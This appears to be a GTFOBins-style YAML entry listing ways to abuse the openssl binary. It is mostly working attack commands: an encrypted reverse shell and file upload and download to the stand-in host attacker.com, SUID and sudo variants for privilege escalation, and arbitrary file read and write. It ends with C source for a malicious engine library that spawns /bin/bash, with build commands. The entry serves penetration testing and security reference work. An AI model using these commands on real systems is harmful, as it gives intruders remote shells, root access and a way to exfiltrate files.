---
functions:
  reverse-shell:
    - description: |
        To receive the shell run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

        Communication between attacker and target will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
  file-upload:
    - description: |
        To collect the file run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save

        Send a local file via TCP. Transmission will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
  file-download:
    - description: |
        To send the file run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

        Fetch a file from a TCP port, transmission will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
  file-write:
    - code: |
        LFILE=file_to_write
        echo DATA | openssl enc -out "$LFILE"
    - code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        openssl enc -in "$TF" -out "$LFILE"
  file-read:
    - code: |
        LFILE=file_to_read
        openssl enc -in "$LFILE"
  suid:
    - description: |
        To receive the shell run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

        Communication between attacker and target will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s

    - code: |
        LFILE=file_to_write
        echo DATA | openssl enc -out "$LFILE"
  sudo:
    - description: |
        To receive the shell run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

        Communication between attacker and target will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
        
  library-load:
    - description: |
        To load an engine library, use the engine parameter:

            openssl req -engine ~/engine.so

        Engines can be created with the following contents.

            #include <stdio.h>
            #include <openssl/engine.h>

            static const char *engine_id = "malengine";
            static const char *engine_name = "Engine for executing arbitrary code";

            static int bind(ENGINE *e, const char *id){
                int ret = 0;
                int status = system("/bin/bash");
                if(!ENGINE_set_id(e,engine_id)){
                    fprintf(stderr, "Failed\n");
                    goto end;
                }
                if(!ENGINE_set_name(e,engine_name)){
                    fprintf(stderr, "Failed\n");
                    goto end;
                }
                ret = 1;
                end:
                    return ret;
            }

            IMPLEMENT_DYNAMIC_BIND_FN(bind)
            IMPLEMENT_DYNAMIC_CHECK_FN()
      

        and compiled as follows
      code: |
          gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -lcrypto a.o
  
---
